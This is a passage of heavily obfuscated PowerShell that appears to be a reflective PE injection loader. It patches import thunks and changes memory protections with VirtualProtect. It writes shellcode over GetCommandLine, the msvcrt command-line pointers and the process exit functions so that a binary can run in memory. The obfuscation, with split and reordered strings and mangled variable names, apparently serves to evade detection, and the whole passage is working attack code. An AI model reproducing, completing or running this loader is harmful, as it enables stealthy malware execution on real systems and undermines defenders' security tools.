						    ${PR`OC`E`dureNA`Me} =  (  &("{3}{1}{0}{2}"-f 'A','RI','BlE','GET-vA') ('ZF'+'i2wH')  )."v`ALUE"::("{1}{0}{3}{4}{2}"-f'To','Ptr','i','Strin','gAns').Invoke(${sTRin`ga`d`dR})
					    }
					
					    if (${r`e`Mote`l`Oading} -eq ${tr`Ue})
					    {
						    [IntPtr]${nE`w`THUN`KREf} = &("{0}{2}{1}{3}" -f 'Get-','emoteProcAddre','R','ss') -RemoteProcHandle ${Re`mOTEpRoCH`AN`d`lE} -RemoteDllHandle ${imP`oRTdLl`hANDLe} -FunctionName ${Pr`o`C`EdU`RenAME}
					    }
					    else
					    {
						    [IntPtr]${n`EwThU`NKREF} = ${w`i`N32fuNctIO`NS}."gE`TPr`o`cADd`REss"."INvO`kE"(${imPo`RTdlLH`A`N`DLe}, ${P`Ro`cEd`U`ReNamE})
					    }
					
					    if (${neWT`HU`Nk`Ref} -eq ${NU`lL} -or ${nEWthUn`k`Ref} -eq   ${B`qTa}::"Z`ErO")
					    {
						    Throw ('New'+' '+'fu'+'nction '+'r'+'ef'+'erenc'+'e '+'i'+'s '+'null'+','+' '+'th'+'is '+'is'+' '+'alm'+'os'+'t '+'cer'+'tainl'+'y '+'a '+'b'+'ug '+'i'+'n '+'t'+'his '+'scrip'+'t.'+' '+'Fun'+'ction:'+' '+"$ProcedureName. "+'Dll:'+' '+"$ImportDllPath")
					    }

					     (  &("{1}{0}"-f 'tem','i') ("{4}{1}{0}{2}{3}" -f 'bLe:','A','zfi2','wH','VArI') )."v`AluE"::("{0}{2}{1}{3}"-f'Struc','reT','tu','oPtr').Invoke(${NewtH`Un`kR`eF}, ${THUnKR`ef}, ${f`AlsE})
					
					    ${t`Hun`KreF} = &("{5}{0}{1}{6}{2}{4}{3}"-f 'd','d-S','nedIntA','gned','sUnsi','A','ig') ([Int64]${th`UN`kreF}) ( ${Zfi`2WH}::"SI`zeOf"([Type][IntPtr]))
					    [IntPtr]${OrigiNA`L`Thun`Kref} = &("{4}{6}{0}{3}{2}{5}{1}"-f'dInt','signed','U','As','Add-Si','n','gne') ([Int64]${O`RiG`InALT`H`UnKref}) ( ${z`FI2wH}::"sI`Z`Eof"([Type][IntPtr]))
					    [IntPtr]${oRI`Gin`ALTHunkRe`FVAl} =   ${z`FI2`wH}::"PtRtO`Stru`ctUrE"(${OrI`gI`NAltH`UNKREf}, [Type][IntPtr])
				    }
				
				    ${IMP`O`RTdesCRIPto`RP`TR} = &("{1}{4}{5}{3}{6}{2}{0}" -f'ed','A','n','n','dd-Sig','nedI','tAsUnsig') (${impor`T`d`es`crI`pT`OrptR}) (  (&("{2}{1}{0}" -f'eM','T','geT-I')  ("{2}{0}{3}{1}{4}"-f':Z','i2W','vARiaBLe','f','H') )."vA`LUe"::"s`Ize`Of"([Type]${w`in`32typES}."I`M`AGE_ImPOr`T_des`c`Ript`oR"))
			    }
		    }
	    }

	    Function GET-V`irT`U`Alpr`oT`ECTv`ALue
	    {
		    Param(
		    [Parameter(poSItIoN = 0, mAnDAtory = ${T`RUE})]
		    [UInt32]
		    ${s`ec`TION`ChArAc`Te`R`iSTIcS}
		    )
		
		    ${Pr`oTeCt`Ionf`L`AG} = 0x0
		    if ((${sEctIo`NChARaCTE`R`I`ST`ics} -band ${WIn3`2`cO`N`StANts}."iMage_S`CN`_m`eM`_E`xECUTe") -gt 0)
		    {
			    if ((${SectIon`CHAR`ACteRI`stI`cS} -band ${wIn32Co`N`StANtS}."imA`G`e_S`c`N_Mem_`ReaD") -gt 0)
			    {
				    if ((${SeC`TioN`c`hARacTE`RIs`TI`cS} -band ${win3`2cONs`Tan`Ts}."imAGe_S`cN_Mem`_WR`itE") -gt 0)
				    {
					    ${prOt`eC`Tio`N`FlAG} = ${w`In`32C`O`NstantS}."pAge`_EXEcUte_r`eA`DwR`ITe"
				    }
				    else
				    {
					    ${p`ROTeCti`On`F`LAG} = ${win3`2cOnSt`A`NtS}."Pa`g`E_EXEC`UTe`_reAD"
				    }
			    }
			    else
			    {
				    if ((${S`ectiO`NCharAcTERIS`T`i`Cs} -band ${wiN32`Con`sT`AN`TS}."ImAg`e_`SCN_Mem_`w`RitE") -gt 0)
				    {
					    ${p`RO`TeC`TIo`NFlag} = ${wIn32Co`NS`T`A`NtS}."pAgE_`eXe`cUTE_`WRi`TeCopY"
				    }
				    else
				    {
					    ${P`R`OtEC`TIONF`lAg} = ${WIN3`2`CoN`staN`TS}."PA`GE`_eXecuTe"
				    }
			    }
		    }
		    else
		    {
			    if ((${Se`c`TIONch`A`RaCtErIs`T`iCS} -band ${w`iN32c`Ons`TA`NTS}."imaGe`_Sc`N_mE`m_REAd") -gt 0)
			    {
				    if ((${sec`TiOnc`haR`Ac`T`erI`StiCS} -band ${WIN32C`OnSTAN`Ts}."i`MAGe_`ScN_MEm_wr`ite") -gt 0)
				    {
					    ${P`RO`TECTIOnF`l`AG} = ${WIn32con`S`T`A`NTS}."p`Ag`E_Re`A`DWRITe"
				    }
				    else
				    {
					    ${p`Ro`TE`ctION`FLaG} = ${win`32cOn`ST`A`NTS}."pAge_R`EA`dOnly"
				    }
			    }
			    else
			    {
				    if ((${SecTi`ONcha`R`ActeRI`sTICs} -band ${wi`N32`COnsT`ANTS}."ImAGE_SCN_M`eM`_`WRITe") -gt 0)
				    {
					    ${pRO`Tec`T`IOnFLaG} = ${wIn`32CON`S`TAN`Ts}."Page`_WrITEco`pY"
				    }
				    else
				    {
					    ${PRotec`TiO`N`FLag} = ${W`I`N32CONStAn`TS}."pAGE`_NoACcE`Ss"
				    }
			    }
		    }
		
		    if ((${se`ctI`Onc`hA`RActE`RIstICs} -band ${wIN3`2cOnS`T`AnTS}."I`mAge_sCN_MEm_`NoT_c`A`cH`ed") -gt 0)
		    {
			    ${PRo`Te`ctI`oNfLag} = ${prot`e`cTi`ONFlag} -bor ${W`in`32`cOnSTa`NtS}."pAGe`_N`oCaCHE"
		    }
		
		    return ${p`R`ot`eCTioN`FLaG}
	    }

	    Function u`PD`A`Te-meM`OrY`Pr`oteCt`IOnFla`gs
	    {
		    Param(
		    [Parameter(POsiTion = 0, maNdAtoRy = ${TR`UE})]
		    [System.Object]
		    ${PE`i`NFo},
		
		    [Parameter(posiTIoN = 1, manDaTORY = ${tR`UE})]
		    [System.Object]
		    ${w`iN32F`UnC`TiOns},
		
		    [Parameter(POsItIOn = 2, MaNDaTory = ${t`Rue})]
		    [System.Object]
		    ${W`IN`3`2ConStan`TS},
		
		    [Parameter(poSItiOn = 3, MaNDaTorY = ${tr`UE})]
		    [System.Object]
		    ${W`i`N32tYp`Es}
		    )
		
		    for( ${i} = 0; ${I} -lt ${p`eiN`Fo}."I`MaG`E_N`T_hEADers"."Fi`l`e`HEadeR"."n`U`MBer`OfsECtioNs"; ${i}++)
		    {
			    [IntPtr]${Sect`iOn`H`Ead`ERp`TR} = [IntPtr](&("{2}{4}{3}{0}{1}"-f'n','signed','Add-S','gnedIntAsU','i') ([Int64]${PeIn`FO}."SeCtio`NHEAd`eRpTr") (${i} *   ${zF`I2wh}::"SIz`EoF"([Type]${win32`Ty`p`es}."IMaGE`_s`eCTion_h`Ead`Er")))
			    ${S`eCti`oN`h`eAder} =  ( &("{0}{1}"-f'Get-Ite','m') ("{0}{2}{1}" -f'VARIabLE:z','wH','Fi2'))."va`LUe"::"PTrTO`sTRU`Ct`URe"(${seCTiON`H`e`AdERP`TR}, [Type]${WIn`32t`ypES}."imA`Ge_`sEcTioN_HE`ADeR")
			    [IntPtr]${s`Ec`TIO`Nptr} = &("{0}{4}{3}{2}{1}"-f 'Add-','gned','IntAsUnsi','d','Signe') (${peIN`FO}."PEH`Andle") (${S`ECtIo`NHEA`dEr}."virt`Uala`dD`Re`SS")
			
			    [UInt32]${pROt`eCtFL`AG} = &("{3}{0}{4}{1}{2}"-f'V','lP','rotectValue','Get-','irtua') ${s`eCTi`OnhEa`dER}."c`HARA`C`TEriS`TICS"
			    [UInt32]${sECTioNS`I`ZE} = ${SeCtIO`NhE`A`D`ER}."vIrTU`A`lS`ize"
			
			    [UInt32]${old`Pr`otEC`TfL`AG} = 0
			    &("{0}{4}{5}{3}{2}{1}"-f'T','id','geVal','n','est-Me','moryRa') -DebugString ("{6}{3}{1}{2}{0}{8}{5}{7}{4}" -f'l','on','F','rotecti','lProtect','::Vi','Update-MemoryP','rtua','ags') -PEInfo ${pEiN`FO} -StartAddress ${s`ecTI`O`NpTr} -Size ${s`eCTiO`NSi`ze} | &("{0}{1}"-f 'Out-','Null')
			    ${suC`Ce`ss} = ${Wi`N32FuNc`Ti`Ons}."vI`RtUaLP`Ro`TeCT"."i`N`VOKE"(${SE`CTi`o`NptR}, ${SEcti`On`sI`zE}, ${pr`o`TecTFLaG}, [Ref]${old`PRoTeCt`FL`Ag})
			    if (${s`UCcesS} -eq ${fA`Lse})
			    {
				    Throw ("{7}{2}{6}{1}{0}{3}{5}{4}"-f 'mem','ge ','c','ory pr','tection','o','han','Unable to ')
			    }
		    }
	    }
	
	    
	    
	    Function uP`D`ATe-ex`eFU`NcT`IonS
	    {
		    Param(
		    [Parameter(POSiTIoN = 0, MaNdAtORY = ${TR`Ue})]
		    [System.Object]
		    ${Pei`NFo},
		
		    [Parameter(poSItIoN = 1, MAnDAtOry = ${tr`UE})]
		    [System.Object]
		    ${w`IN3`2fUn`ctIONS},
		
		    [Parameter(posiTION = 2, manDaTORY = ${t`RuE})]
		    [System.Object]
		    ${win3`2`c`onstaNTs},
		
		    [Parameter(POSItIoN = 3, mandAToRY = ${tr`UE})]
		    [String]
		    ${exeA`RgUm`ENTS},
		
		    [Parameter(pOsitIon = 4, maNdaTOry = ${TR`UE})]
		    [IntPtr]
		    ${EXed`o`N`ebYt`epTR}
		    )
		
		    
		    ${REtuR`NA`R`Ray} = @() 
		
		    ${p`TrSizE} =   ( &("{1}{0}{2}" -f 'Ri','va','abLe')  ("{1}{2}{0}"-f '2wh','z','Fi') )."va`lue"::"sI`zE`OF"([Type][IntPtr])
		    [UInt32]${olDP`RoTE`c`Tf`lag} = 0
		
		    [IntPtr]${k`E`Rn`El3`2hANDLE} = ${wi`N32`FuNctiOns}."GETMODu`LE`hAN`DLE"."iN`V`OKE"(("{0}{3}{2}{1}" -f'K','l','el32.dl','ern'))
		    if (${ke`RNEL32H`AN`dLE} -eq  ${B`Qta}::"zE`Ro")
		    {
			    throw ("{1}{4}{0}{2}{3}"-f 'nd','Kernel32 ','le nu','ll','ha')
		    }
		
		    [IntPtr]${keR`NeLB`As`EH`ANdlE} = ${w`in32`FuNcTI`oNS}."gET`modULe`HA`ND`Le"."i`NVoKe"(("{3}{2}{1}{0}" -f 'll','Base.d','el','Kern'))
		    if (${k`E`RNeLbase`hanDlE} -eq  (  &("{1}{0}" -f'r','di')  ("{1}{2}{0}"-f 'TA','VaRiABl','e:bQ') )."va`lUE"::"Ze`RO")
		    {
			    throw ("{1}{4}{2}{3}{0}{5}{6}" -f'nd','Ke','nelBa','se ha','r','le nu','ll')
		    }

		    
		    
		    
		    ${C`mdLiN`eWaRgs`ptR} =  (&('Ls')  ("{2}{0}{4}{1}{3}" -f'ARi','e:zfi2','V','Wh','aBL'))."v`ALUE"::("{3}{0}{1}{2}"-f'n','gToH','GlobalUni','Stri').Invoke(${E`Xe`ARGu`Me`Nts})
		    ${Cmdli`NEaA`RgSP`Tr} =   ${Z`FI2`wh}::("{2}{1}{3}{0}" -f 'balAnsi','tringT','S','oHGlo').Invoke(${Ex`eaR`gum`EnTS})
	
		    [IntPtr]${G`Et`cOmmANd`l`IN`EAA`DdR} = ${W`In32FUN`CTi`oNS}."gE`TPRO`cAddRe`ss"."i`NVO`KE"(${kE`RNE`lBAsEh`AnDLe}, ("{4}{2}{1}{0}{3}" -f'Lin','ommand','tC','eA','Ge'))
		    [IntPtr]${GeTcOM`mAndlINE`WAd`dR} = ${W`iN32f`UncTiONS}."g`ET`PR`ocAd`dRESs"."i`NvOkE"(${ke`RNeLBASEh`A`Nd`lE}, ("{0}{2}{3}{1}" -f'Ge','dLineW','t','Comman'))

		    if (${gEtc`o`MmANDL`i`NEaADDR} -eq  ${b`qTA}::"Ze`RO" -or ${geT`CO`mm`ANDLi`NE`Wa`DDR} -eq   (  &("{1}{0}{2}" -f 'I','geT-vAR','aBLE') ("{0}{1}" -f 'bQT','a')  -vALUe )::"ZE`Ro")
		    {
			    throw ('GetCo'+'mmandL'+'i'+'ne '+'pt'+'r '+'nu'+'ll. '+'Ge'+'tC'+'o'+'mmandL'+'ineA'+': '+"$GetCommandLineAAddr. "+'Ge'+'tCom'+'ma'+'ndLi'+'neW:'+' '+"$GetCommandLineWAddr")
		    }

		    
		    [Byte[]]${sH`E`llco`DE1} = @()
		    if (${PT`RS`IZe} -eq 8)
		    {
			    ${s`hEL`lcOdE1} += 0x48	
		    }
		    ${S`H`elL`cOdE1} += 0xb8
		
		    [Byte[]]${s`HEll`CODE2} = @(0xc3)
		    ${t`OtAlsi`Ze} = ${S`he`LLcode1}."le`Ngth" + ${P`TR`sIze} + ${sHElL`co`dE2}."l`eN`Gth"
		
		
		    
		    ${gETCO`Mman`dlin`eaO`RIgby`TesP`Tr} =   (&("{2}{1}{0}" -f'aBLE','ari','v') ("{1}{0}" -f'WH','zFi2')  )."v`AlUE"::("{2}{1}{0}"-f'al','HGlob','Alloc').Invoke(${Tot`A`lSizE})
		    ${gE`TCO`Mman`dLiN`ewO`RIgBYTeSPtR} =  (&("{0}{1}" -f 'C','HILDITem')  ("V"+"aRiaBLe"+":zFi2w"+"h") )."v`ALUe"::("{0}{1}{2}" -f'All','oc','HGlobal').Invoke(${T`O`T`Alsize})
		    ${wiN32FU`Nct`io`NS}."MeM`Cpy"."InvO`ke"(${gEtcOmmaNDLiN`EAOr`IGb`YT`eSpTr}, ${gEtComMAn`dL`I`NeA`ADDr}, [UInt64]${t`otA`lSi`ZE}) | &("{1}{0}" -f'ull','Out-N')
		    ${wI`N32`F`UN`CtionS}."me`mCpY"."iNVo`Ke"(${gEtcoMmAndlinE`WOR`I`G`B`yTesp`TR}, ${g`eTC`Om`mandlIN`EWaDdR}, [UInt64]${to`Ta`lSIZe}) | &("{2}{0}{1}" -f'ut-Nul','l','O')
		    ${Ret`Ur`Nar`RAy} += ,(${GeT`COM`M`AnDLI`NE`A`AdDr}, ${getc`OMM`A`N`DLiNEA`O`RIGByt`EsPtr}, ${t`oTALsI`zE})
		    ${rE`TurN`ARr`Ay} += ,(${Ge`T`coMMANDliNewAD`dR}, ${g`Et`CoM`MAnDLIN`eW`oR`IgBYtes`pTR}, ${tO`T`ALsI`Ze})

		    
		    [UInt32]${ol`D`PRotECtF`LAg} = 0
		    ${s`UccESs} = ${w`in3`2f`Unc`TiOns}."virtU`A`lprO`TEct"."In`VOkE"(${Get`cOm`mA`Nd`Li`Ne`AADDR}, [UInt32]${tOtaL`s`izE}, [UInt32](${WIn32`CO`N`sTAn`Ts}."PAG`e_`execU`Te_rEadw`RITE"), [Ref]${OL`DP`RoTeCt`FlaG})
		    if (${SUcce`SS} = ${F`A`LSe})
		    {
			    throw ("{6}{5}{0}{1}{2}{3}{4}"-f'to Virtua','lProtect fai','l','e','d','all ','C')
		    }
		
		    ${g`etComMAND`Li`NE`A`ADd`RtEMP} = ${GETcoMma`NDli`N`EaAddr}
		    &("{5}{1}{2}{4}{0}{3}"-f 'r','ite-BytesT','oM','y','emo','Wr') -Bytes ${sh`E`l`lcOdE1} -MemoryAddress ${g`EtCO`MMa`NDLI`NEaA`DdRT`emP}
		    ${getco`mman`D`LineaAD`DRTemp} = &("{2}{3}{6}{4}{5}{0}{1}"-f'n','ed','Add','-Sig','IntAs','Unsig','ned') ${G`etCo`MMA`Nd`lINe`AaDDrTeMP} (${sh`el`lco`De1}."L`En`Gth")
		      ${ZF`i2wH}::("{2}{0}{1}"-f'ureT','oPtr','Struct').Invoke(${CmDl`i`NE`AArg`sPtR}, ${GeTComM`ANdlINeaAd`dr`T`EMP}, ${fal`Se})
		    ${gEtcOmmAN`D`LiNEaad`D`R`Te`mP} = &("{4}{1}{3}{2}{0}" -f 'gned','-Signe','ntAsUnsi','dI','Add') ${geTCOmmAndlIN`E`A`ADD`RtEmp} ${P`TRsi`ze}
		    &("{1}{0}{5}{4}{2}{3}" -f 't','Wri','T','oMemory','es','e-Byt') -Bytes ${sHEllc`o`DE2} -MemoryAddress ${Ge`T`COMmaNdli`Neaadd`RtemP}
		
		    ${wi`N`3`2FuNc`TionS}."V`IRtUaL`PR`oTECT"."in`VOKE"(${g`EtcOm`MAnd`lIne`A`ADDR}, [UInt32]${tot`ALSI`ze}, [UInt32]${OL`D`PR`oteC`TfLaG}, [Ref]${Ol`d`p`RO`TEctfLaG}) | &("{2}{0}{1}" -f 'ut','-Null','O')
		
		
		    
		    [UInt32]${oLDprOtECT`F`LAG} = 0
		    ${sUc`CEss} = ${W`In`32FUnCti`O`NS}."V`I`R`TUalpRO`TeCt"."inVo`Ke"(${gETC`O`MManDl`INeWAdDr}, [UInt32]${To`T`AlsIze}, [UInt32](${Wi`N32C`ON`ST`ANtS}."pAGE_ExeC`Ute`_`ReADWr`ITe"), [Ref]${OldPR`OTeC`TfL`Ag})
		    if (${Su`c`cESS} = ${fa`l`SE})
		    {
			    throw ("{0}{1}{6}{5}{4}{3}{2}"-f 'Call to Vir','tu','iled',' fa','otect','r','alP')
		    }
		
		    ${ge`TCOm`ma`NDLiNeWadDRTE`mP} = ${gEtcO`M`mAnDL`i`N`EwadDr}
		    &("{0}{3}{1}{2}{4}"-f 'W','ToMem','o','rite-Bytes','ry') -Bytes ${sHe`L`LCo`de1} -MemoryAddress ${getCoM`Man`dL`IneWA`DDRtemP}
		    ${GEtcOMMAnD`L`I`NeWAD`Dr`TeMp} = &("{2}{5}{3}{1}{4}{0}"-f 'igned','edI','Add-S','n','ntAsUns','ig') ${GeTC`O`M`mANdliNeWA`DDrte`Mp} (${s`hE`lLcoDe1}."Le`NG`Th")
		      ( &("{1}{2}{0}" -f'e','geT-vaRIa','BL')  ("Zfi2"+"wH") )."v`AlUe"::("{2}{1}{0}"-f 'ToPtr','tructure','S').Invoke(${C`M`dLiNewaRg`sPtr}, ${GeTco`mM`ANDlIN`EWad`Drte`Mp}, ${FA`lSE})
		    ${GeTCOMmAnDlIn`EwA`DdR`Te`mp} = &("{0}{2}{4}{1}{3}"-f 'Add-','n','S','edIntAsUnsigned','ig') ${gEt`comma`NdLiNewa`DDRt`e`mP} ${PtRs`ize}
		    &("{2}{0}{1}{3}"-f 'rite-BytesTo','Memor','W','y') -Bytes ${sHel`Lc`oDE2} -MemoryAddress ${getcoMm`And`L`i`NEw`AdDrteMP}
		
		    ${WI`N32f`UnctiOns}."v`IRt`UALpr`Otect"."INv`oKE"(${G`etC`om`MANDLiNE`WAD`dR}, [UInt32]${t`o`TalsIZE}, [UInt32]${old`pR`oTectf`LaG}, [Ref]${o`L`dpR`o`TEctFlaG}) | &("{2}{0}{1}" -f 't-N','ull','Ou')
		    
		
		
		    
		    
		    
		    
		    
		    ${DlLl`ISt} = @(("{2}{1}{0}"-f '.dll','70d','msvcr'), ("{2}{0}{1}"-f 'vcr71d','.dll','ms'), ("{1}{0}{2}{3}" -f 'r80d.','msvc','dl','l'), ("{0}{1}{2}"-f'm','sv','cr90d.dll'), ("{1}{0}{2}"-f '0d.d','msvcr10','ll'), ("{0}{1}{2}{3}" -f 'msvcr1','10d','.dl','l'), ("{2}{1}{0}" -f '70.dll','cr','msv') `
			    , ("{0}{2}{1}"-f 'msvcr71.d','l','l'), ("{1}{0}{2}"-f 'svcr80','m','.dll'), ("{0}{2}{3}{1}"-f 'msvcr','.dll','9','0'), ("{2}{1}{3}{0}"-f 'dll','cr10','msv','0.'), ("{0}{1}{2}"-f'msvcr','110.dl','l'))
		
		    foreach (${d`LL} in ${D`llL`isT})
		    {
			    [IntPtr]${dLl`H`AnDlE} = ${W`In32`FUn`CtiONS}."GeTmod`ULeHaN`D`lE"."I`NVOKE"(${d`LL})
			    if (${dlL`H`ANDlE} -ne   (&("{0}{1}{2}" -f 'CH','iLDi','tem') ('v'+'A'+'Ria'+'bl'+'E:Bqta'))."V`ALUe"::"Z`erO")
			    {
				    [IntPtr]${Wc`mDLN`Ad`dR} = ${wiN3`2f`U`Nc`TIONS}."geTPRoC`A`ddrESS"."i`NvO`Ke"(${D`ll`HanDLe}, ("{0}{1}"-f '_w','cmdln'))
				    [IntPtr]${acmdln`AD`DR} = ${wIn32`F`UnctIONs}."GetP`R`OCa`ddr`esS"."I`NvOKe"(${D`lLhAnD`LE}, ("{0}{2}{1}" -f'_a','mdln','c'))
				    if (${W`CmdL`N`ADDR} -eq  ${B`qTA}::"z`ErO" -or ${A`cmdlN`AdDr} -eq   ${b`qta}::"ZE`RO")
				    {
					    ((("{5}{1}{4}{3}{2}{0}{6}" -f '_wcmdln or _ac','r, coul','find ','ZCmt ','dn','Erro','mdln'))."re`pL`AcE"(([cHaR]90+[cHaR]67+[cHaR]109),[strIng][cHaR]39))
				    }
				
				    ${NeWAC`mD`lN`pTR} =  ( &("{1}{0}" -f'TEm','i') ('v'+'arIA'+'BLe'+':ZFI2wh'))."v`Alue"::("{4}{3}{2}{1}{0}" -f 'balAnsi','Glo','gToH','trin','S').Invoke(${e`XEA`R`guM`eNTs})
				    ${NeWW`cM`d`lNptR} =   ( &("{1}{2}{0}"-f 'eM','Get-','iT')  ("V"+"Ar"+"iabLe:"+"zFI2W"+"h"))."va`lUe"::("{3}{2}{1}{0}{4}"-f'oHGlob','gT','in','Str','alUni').Invoke(${Exea`RG`UmenTS})
				
				    
				    ${ORiGa`CmD`lNP`Tr} =   (&("{0}{1}"-f 'vAr','iAblE') ("{1}{0}" -f'2WH','zfi'))."VAl`Ue"::"PT`RTO`st`RUctUrE"(${A`c`mdlnAdDR}, [Type][IntPtr])
				    ${Or`I`gWcmdLn`ptr} =  ( &("{0}{1}"-f'Gc','I')  ("{1}{0}{3}{2}" -f'arIable','V','wh',':ZfI2'))."v`ALue"::"PtRt`OS`T`RuC`TurE"(${WcMDL`NAD`DR}, [Type][IntPtr])
				    ${Or`IGAcmdl`NPtrS`TO`R`AGE} =   ( &("{2}{0}{1}"-f'ariA','BLE','V') ("{1}{0}"-f'I2wH','zf')  -valuEoNLY)::("{1}{0}{2}{3}"-f 'l','Al','ocH','Global').Invoke(${pTR`s`Ize})
				    ${Ori`GW`CmDlnptR`stO`RaGe} =  ${ZFi2`WH}::("{2}{1}{0}" -f'al','ocHGlob','All').Invoke(${p`TrS`ize})
				      ( &("{2}{1}{0}{3}" -f 'd','t-CHiL','gE','Item')  ("vArIAb"+"le:Z"+"F"+"I2WH") )."Va`luE"::("{1}{0}{2}"-f'uctureToP','Str','tr').Invoke(${oR`iG`AcmdLN`p`TR}, ${oRIgacM`dLN`PT`R`STOragE}, ${fal`sE})
				     (  &("{1}{0}{2}"-f'a','v','rIablE')  ("{1}{0}"-f 'H','zfi2w')  -VA)::("{0}{2}{1}{3}" -f'Struc','ToP','ture','tr').Invoke(${Or`Ig`Wc`mD`LNptr}, ${o`Ri`gwc`mdlNPT`RsTo`RAge}, ${FAl`se})
				    ${rEtU`RnA`RR`AY} += ,(${AC`mdL`N`AddR}, ${ORIga`CMDLNPTRsT`o`RA`ge}, ${Pt`R`sizE})
				    ${RetuRN`A`RraY} += ,(${W`CMD`lnaD`DR}, ${O`RiGW`c`mdlnptRs`T`oRaGE}, ${p`T`RSiZe})
				
				    ${sUc`CesS} = ${WiN`32`F`Unctio`Ns}."v`iR`TUalprot`E`ct"."In`Voke"(${ac`mdl`NAD`dr}, [UInt32]${P`TR`sIZe}, [UInt32](${WIn3`2COnsTa`N`TS}."PAge_ExE`cUtE_r`E`ADwr`ITE"), [Ref]${OL`dPr`ot`EcTflAG})
				    if (${SU`Cce`ss} = ${fa`L`sE})
				    {
					    throw ("{8}{4}{1}{3}{7}{5}{2}{6}{0}" -f'd','ual','fail','Pro','Virt',' ','e','tect','Call to ')
				    }
				     (&("{1}{0}" -f 'IaBlE','vaR') ("{0}{1}" -f 'zFi2','wH')  -valUEO)::("{3}{2}{1}{0}" -f'oPtr','ureT','ruct','St').Invoke(${Ne`w`ACmdl`Nptr}, ${acm`DlN`AdDr}, ${F`A`LsE})
				    ${Win3`2f`UNCti`OnS}."v`I`R`TuaLpRoTECt"."iNVo`Ke"(${AcmD`ln`AdDr}, [UInt32]${p`TRS`IZe}, [UInt32](${olDpr`OteC`T`FLaG}), [Ref]${O`LdP`RoT`EC`TFlAg}) | &("{0}{1}{2}" -f 'O','ut','-Null')
				
				    ${SUcc`esS} = ${wIn3`2FUnct`Io`NS}."virt`UAL`PR`oTE`ct"."inVO`ke"(${wcMd`l`NadDr}, [UInt32]${p`TR`SIzE}, [UInt32](${wIN32c`o`NsT`ANTs}."PaGe_exe`cuTE_R`eadW`Ri`TE"), [Ref]${OlDp`RoT`EcTfl`AG})
				    if (${suC`c`ESS} = ${FA`LsE})
				    {
					    throw ("{3}{1}{4}{0}{6}{5}{2}"-f 't','irtualPr','ed','Call to V','o','ct fail','e')
				    }
				      (&("{2}{1}{0}"-f 'lE','AB','vAri')  ("z"+"Fi2"+"WH")  -VAlueonL  )::("{0}{3}{2}{1}{4}" -f'S','ctureT','ru','t','oPtr').Invoke(${N`ewWc`md`lN`PtR}, ${WcMD`lNA`ddR}, ${Fa`lSe})
				    ${WIn3`2`FuNCTiOns}."virTuaLP`ROTe`ct"."iNV`Oke"(${WcM`dLna`DDR}, [UInt32]${Pt`R`SIze}, [UInt32](${OLd`PRO`Te`CTf`lAg}), [Ref]${O`LD`pROte`Ctf`lag}) | &("{1}{2}{0}"-f'ull','Out-','N')
			    }
		    }
		    
		
		
		    
		    

		    ${reTurnAr`R`AY} = @()
		    ${eXiT`F`UNC`TIOns} = @() 
		
		    
		    [IntPtr]${MS`CO`REehAndlE} = ${WiN`3`2fun`CT`Ions}."g`ETMO`dUL`EhA`Ndle"."i`N`VOKe"(("{1}{3}{0}{2}"-f'cor','m','ee.dll','s'))
		    if (${ms`COReehA`Nd`lE} -eq   ${BQ`TA}::"Z`Ero")
		    {
			    throw ("{1}{0}{2}{3}" -f 'or','msc','ee handle n','ull')
		    }
		    [IntPtr]${c`orexITpRoceS`s`A`ddR} = ${WIn32FUn`cTI`O`Ns}."G`E`TprOCaddR`Ess"."i`N`VOke"(${m`SCO`R`eEhan`DLE}, ("{1}{2}{4}{3}{0}"-f'cess','Co','rExit','ro','P'))
		    if (${cO`REX`ITpRO`cEssaddR} -eq   (  &("{0}{1}{2}" -f 'c','hI','LDitEM') ("v"+"ARiAB"+"LE:"+"BqTA")  )."va`LuE"::"ZE`RO")
		    {
			    Throw ("{4}{6}{3}{2}{5}{8}{0}{1}{7}"-f 'n','ot foun','s','e','CorExit','s address','Proc','d',' ')
		    }
		    ${eXIt`FunC`TiO`NS} += ${cO`REXiT`prOcE`SSAD`dR}
		
		    
		    [IntPtr]${E`x`ITPro`C`esSAddr} = ${WI`N32FuncT`Io`Ns}."GeTpRoCa`Ddr`eSs"."I`Nv`okE"(${keR`NeL`32ha`NdLe}, ("{3}{2}{1}{0}"-f'rocess','tP','i','Ex'))
		    if (${E`XiTPRoc`ESs`A`ddr} -eq  ${BQ`TA}::"zE`Ro")
		    {
			    Throw ("{2}{5}{3}{1}{4}{0}{6}" -f' foun',' n','E','ess address','ot','xitProc','d')
		    }
		    ${EXitf`UN`C`TI`ONs} += ${EXI`TprOC`ess`AD`dR}
		
		    [UInt32]${o`LDP`R`OTEcTfl`AG} = 0
		    foreach (${P`RocExiTFUn`c`TiON`AdDr} in ${E`Xi`T`Fu`NCtIOns})
		    {
			    ${PRocexI`TF`UNctionA`DdR`T`MP} = ${pROce`xitFUnc`T`ION`A`D`DR}
			    
			    
			    [Byte[]]${S`hEllcod`e1} = @(0xbb)
			    [Byte[]]${shELLc`od`E2} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			    
			    if (${ptr`SiZe} -eq 8)
			    {
				    [Byte[]]${SHEl`l`cODE1} = @(0x48, 0xbb)
				    [Byte[]]${s`h`ELl`CODe2} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			    }
			    [Byte[]]${s`HeL`lCoDe3} = @(0xff, 0xd3)
			    ${TOTa`Lsi`Ze} = ${s`HElLC`ode1}."LE`N`gTh" + ${pTrS`I`ZE} + ${ShE`L`LcO`De2}."len`GTH" + ${PTr`siZe} + ${sHelLCO`d`e3}."le`NgTh"
			
			    [IntPtr]${eX`ITthr`Ead`ADDR} = ${w`in`32FUn`CTiOnS}."Getpr`OC`AdDresS"."i`N`VOkE"(${K`ernel`32H`ANDlE}, ("{2}{1}{0}" -f'ead','itThr','Ex'))
			    if (${ex`ItThrE`AD`Ad`dr} -eq   (&("{2}{0}{3}{1}"-f 'varI','ble','Get-','A') ("bqT"+"a") -vaLueonL  )::"ze`RO")
			    {
				    Throw ("{7}{1}{3}{0}{6}{5}{4}{2}"-f 'ad','Thr','d','e',' foun','ess not',' addr','Exit')
			    }

			    ${succ`ess} = ${WIn`32FuN`c`TionS}."V`irT`UaLPR`o`TecT"."invo`ke"(${PRo`Cex`i`T`FU`NCTiOn`ADDr}, [UInt32]${t`OtaL`SIze}, [UInt32]${wIn`32C`ONSTaN`TS}."P`AgE_exe`CUTE_`Read`wr`ItE", [Ref]${olDpr`o`T`eCTfL`AG})
			    if (${SU`CCEsS} -eq ${fA`Lse})
			    {
